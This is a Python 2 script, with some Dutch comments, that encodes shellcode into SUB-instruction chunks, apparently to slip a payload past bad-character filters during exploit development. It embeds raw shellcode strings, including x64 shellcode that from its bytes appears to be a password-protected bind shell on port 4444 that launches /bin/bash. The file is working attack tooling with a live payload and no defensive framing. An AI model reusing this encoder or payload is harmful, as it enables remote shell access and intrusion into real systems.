#shellcode = r"\x75\xe7\xff\xe7"
#shellcode = r"\xaf\x75\xea\xaf"
#shellcode = r"\x75\xe7\xff\xe7"
#shellcode = r"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
shellcode = r"\x66\xe7\xca\xe7\x0f\xe7\x52\x75\x02\xff\xcd\xff\x3c\x05\x5a\xe7\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
shellcode = r"\xe7\xe7\xe7\x77"
shellcode = (r"\x48\x31\xf6\x48\xf7\xe6\x04\x29\x48\xff\xc6\x56\x5f\x48\xff\xc7"
r"\x0f\x05\x48\x97\x48\x31\xc0\x04\x31\x52\x66\x52\x66\x52\x66\x68"
r"\x11\x5c\x48\xff\xc2\x48\xff\xc2\x66\x52\x80\xc2\x0e\x48\x89\xe6"
r"\x0f\x05\x48\x31\xc0\x04\x32\x48\x31\xf6\x0f\x05\x48\x31\xc0\x50"
r"\x50\x5a\x5e\x04\x2b\x0f\x05\x48\x97\x48\x31\xf6\x80\xc2\x03\x48"
r"\x31\xc0\x04\x21\x0f\x05\x48\xff\xc6\x48\x39\xd6\x75\xf1\xeb\x23"
r"\x48\x31\xff\x48\xf7\xe7\x57\x5e\x56\x48\xbe\x52\x45\x41\x4c\x4c"
r"\x59\x3f\x21\x56\x48\x89\xe6\x48\xff\xc0\x48\x89\xc7\x48\x83\xc2"
r"\x10\x0f\x05\x48\x31\xff\x48\xf7\xe7\x57\x5e\x56\x48\xbe\x72\x44"
r"\x7a\x20\x49\x5a\x3f\x3f\x56\x48\xbe\x4d\x40\x47\x31\x43\x20\x57"
r"\x4f\x56\x48\x89\xe6\x48\xff\xc0\x48\x89\xc7\x48\x83\xc2\x10\x0f"
r"\x05\x48\x31\xff\x57\x48\xf7\xe7\x48\x89\xe6\x48\x83\xc2\x0c\x0f"
r"\x05\x48\x89\xe7\x48\x31\xf6\x48\x81\xc6\x5a\x65\x72\x5a\x56\x48"
r"\xbe\x50\x33\x57\x50\x33\x57\x6c\x34\x56\x48\x89\xe6\x48\x31\xc9"
r"\x48\x83\xc1\x0b\xf3\xa6\x0f\x85\x74\xff\xff\xff\x48\x31\xf6\x48"
r"\xf7\xe6\x48\x31\xff\x57\x48\x83\xc2\x68\x52\x48\xba\x2f\x62\x69"
r"\x6e\x2f\x62\x61\x73\x52\x48\x31\xd2\x48\x89\xe7\xb0\x3b\x0f\x05")

shellcode = r"\xff\xc0\x48\x89"
if len(shellcode) /4 % 4 != 0:
	print "Shellcode not divisible by 4"
	print "Pad with nops" # todo 

def remove(shellcode):
	shellcode = shellcode.replace("\\x","")
	shellcode = shellcode.replace("'","")
	shellcode = shellcode.replace('"',"")
	print("Hex string   = " + shellcode)
	return shellcode

def reverse(hexstring):
	hexbyte1 = hexstring[0] + hexstring[1]
	hexbyte2 = hexstring[2] + hexstring[3]
	hexbyte3 = hexstring[4] + hexstring[5]
	hexbyte4 = hexstring[6] + hexstring[7]
	newhex = hexbyte4 + hexbyte3 + hexbyte2 + hexbyte1
	print("Hex reversed = " + newhex)
	return newhex

def split(hexstring):
	hexbyte1 = hexstring[0] + hexstring[1]
	hexbyte2 = hexstring[2] + hexstring[3]
	hexbyte3 = hexstring[4] + hexstring[5]
	hexbyte4 = hexstring[6] + hexstring[7]
	hexbyte5 = hexstring[8] + hexstring[9]
	return hexbyte2, hexbyte3, hexbyte4, hexbyte5

def calc(hexvalue1,hexvalue2):
	revhex = hexvalue1
	print "calculating " + hexvalue1 + " " + hexvalue2
	if hexvalue2 == "wrap":
		intofhex = int(revhex, 16) # Make int to be able to calculate
		zeroMin = 0-intofhex & 0xFFFFFFFF # Make the clock go round
		zeroMin = "0x" + hex(zeroMin)[2:].zfill(8) 
		return zeroMin
	else:
		intofhex1 = int(hexvalue1, 16) # Make int to be able to calculate
		intofhex2 = int(hexvalue2, 16)
		diff = intofhex1-intofhex2 & 0xFF # Make the clock go round
		diff = "0x" + hex(diff)[2:]
		return diff

def sub(values):
	zero = 0
	retvalue = [] 
	# if "00" in values:
	# 	print "0x00 found"	
	# 	zero = 1
	for i in values:
		print "the hexchar is: " + i
		hex7c = int('0x7c', 16)
		hexchar = int(i, 16)
		if hexchar == 0:
			print "Dealing with 00"
			hexchar += 100
			retvalue += '0x7c', '0x7c', '0x08'
		elif hexchar <= hex7c:
			nextsub = '0x01' 
			hexchar = hexchar - 0x02 # deze nog aanpassen ivm 0 
			#hexchar = hex(hexchar)
			hexchar = "0x" + hex(hexchar)[2:].zfill(2)
			print "<=7c so -2: " + hexchar
			retvalue += hexchar,nextsub,nextsub
			print retvalue
		elif hexchar >= hex7c*2:
			remainder = hexchar - (hex7c + hex7c)
			#remainder = int('0x06', 16)
			#print remainder
			remainder = "0x" + hex(remainder)[2:].zfill(2)
			print "groter dan 0xF8 aaa " + hex(hexchar) + " remainder is " + remainder
			hex7c = hex(hex7c)
			retvalue += hex7c, hex7c, remainder
			print retvalue
		else:
			remainder = hexchar - hex7c - 0x01
			remainder = "0x" + hex(remainder)[2:].zfill(2)
			print "tussen 7C en F8 " + hex(hexchar) + " remainder is " + remainder
			hex7c = hex(hex7c)
			retvalue += hex7c, remainder,'0x01'
			print retvalue
			#chunk1 = sub3(a)
	
	# In case of a 00 we must change some values
	if values[0] == "00":
		print "first value"
	if values[1] == "00":
		print "second value is 00"
		print retvalue
		#retvalue[0] = "0x15"
		retvalue[0] = calc(retvalue[0],'0x01') 

	if values[2] == "00":
		print "third value is 00"
		retvalue[3] = calc(retvalue[3],'0x01')

	if values[3] == "00":
		print "fourth value"
	return retvalue

def test(chunks):
	#print str(chunks[1])
	intofhex1 = int(chunks[0], 16)
	intofhex2 = int(chunks[1], 16)
	intofhex3 = int(chunks[2], 16)
	
	
	test = hex(0-intofhex1 - intofhex2 - intofhex3 & 0xFFFFFFFF)
	result = "0x" + test[2:].zfill(8)
	#print test
	return result
	 

def strip(ugly):
	n = 2
	nice = [ugly[index : index + n] for index in range(0, len(ugly), n)]
	nice = "".join(nice[1::2])
	nice = nice.upper() 
	return nice 

def subtable(retvalue):
	nice = []
	#chunk1 = retvalue[9:12][0] + retvalue[6:9][0] + retvalue[3:6][0] + retvalue[0:3][0]
	chunk1 = retvalue[0:3][0] + retvalue[3:6][0] + retvalue[6:9][0] + retvalue[9:12][0] 
	#chunk2 = retvalue[9:12][1] + retvalue[6:9][1] + retvalue[3:6][1] + retvalue[0:3][1]
	chunk2 = retvalue[0:3][1] + retvalue[3:6][1] + retvalue[6:9][1] + retvalue[9:12][1]
	#chunk3 = retvalue[9:12][2] + retvalue[6:9][2] + retvalue[3:6][2] + retvalue[0:3][2]
	chunk3 = retvalue[0:3][2] + retvalue[3:6][2]  + retvalue[6:9][2] + retvalue[9:12][2] 
	print chunk1, chunk2, chunk3   
	print "Creating  subtables ..."
	nice.append(strip(chunk1))
	nice.append(strip(chunk2))
	nice.append(strip(chunk3))
	print nice
	return nice

# ? weet ik ff niet meer
n = 4*4
# Cut shellcode in pieces of 4 bytes
shellcode = [shellcode[i:i+n] for i in range(0, len(shellcode), n)]
for i in shellcode:
	shellcode = str(i)
	loosevalues = []
	print "Sub-encoding: " + shellcode   	
	hexclean = remove(shellcode) # Remove slashes etc
	revhex = reverse(hexclean) # Reverse the string endianess
	hexzeroMin = calc(revhex,"wrap")
	print "0 - passed Hex = " + hexzeroMin
	loosevalues = split(hexzeroMin)
	chunks = sub(loosevalues)
	newchunks = subtable(chunks)
	print "Doing test to revert"
	for chunk in newchunks:
		print chunk
	
	if not str(test(newchunks)) == str("0x"+revhex):
		print "This is not good ..."
		print "0x"+revhex
		print str(test(newchunks))
		exit()

	#print test(newchunks)